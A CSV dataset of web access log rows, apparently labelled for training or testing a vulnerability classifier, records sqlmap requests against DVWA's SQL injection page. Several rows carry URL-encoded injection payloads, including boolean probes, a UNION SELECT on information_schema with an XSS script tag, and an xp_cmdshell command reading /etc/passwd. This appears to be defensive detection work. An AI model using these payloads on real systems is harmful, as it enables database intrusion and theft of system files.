ip,identity,user,timestamp,request,status,size,referer,user_agent,vulnerability,method,url,protocol,request_length,url_parts,user_agent_length,Predicted_Vulnerability
12.12.12.12,-,-,2024-06-30 14:40:10-04:00,GET /DVWA/vulnerabilities/sqli/?id=id&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id&Submit=Submit,HTTP/1.1,60,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:10-04:00,GET /DVWA/vulnerabilities/sqli/?id=id&Submit=Submit&yiiX=8582%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id&Submit=Submit&yiiX=8582%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,HTTP/1.1,324,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:10-04:00,GET /DVWA/vulnerabilities/sqli/?id=id&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id&Submit=Submit,HTTP/1.1,60,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:10-04:00,GET /DVWA/vulnerabilities/sqli/?id=4207&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=4207&Submit=Submit,HTTP/1.1,62,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:10-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%29%27%28%28.%22%29%28%29%2C&Submit=Submit HTTP/1.1,200,651,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%29%27%28%28.%22%29%28%29%2C&Submit=Submit,HTTP/1.1,88,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:10-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27rpcWHQ%3C%27%22%3EcpMzYZ&Submit=Submit HTTP/1.1,200,666,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27rpcWHQ%3C%27%22%3EcpMzYZ&Submit=Submit,HTTP/1.1,87,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%29%20AND%203715%3D6121%20AND%20%28%27QuHR%27%3D%27QuHR&Submit=Submit HTTP/1.1,200,667,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%29%20AND%203715%3D6121%20AND%20%28%27QuHR%27%3D%27QuHR&Submit=Submit,HTTP/1.1,118,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%29%20AND%206580%3D6580%20AND%20%28%27fQsn%27%3D%27fQsn&Submit=Submit HTTP/1.1,200,663,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%29%20AND%206580%3D6580%20AND%20%28%27fQsn%27%3D%27fQsn&Submit=Submit,HTTP/1.1,118,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%205326%3D7443%20AND%20%27QTJv%27%3D%27QTJv&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%205326%3D7443%20AND%20%27QTJv%27%3D%27QTJv&Submit=Submit,HTTP/1.1,112,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%206580%3D6580%20AND%20%27uXVl%27%3D%27uXVl&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%206580%3D6580%20AND%20%27uXVl%27%3D%27uXVl&Submit=Submit,HTTP/1.1,112,5,40,SQLi
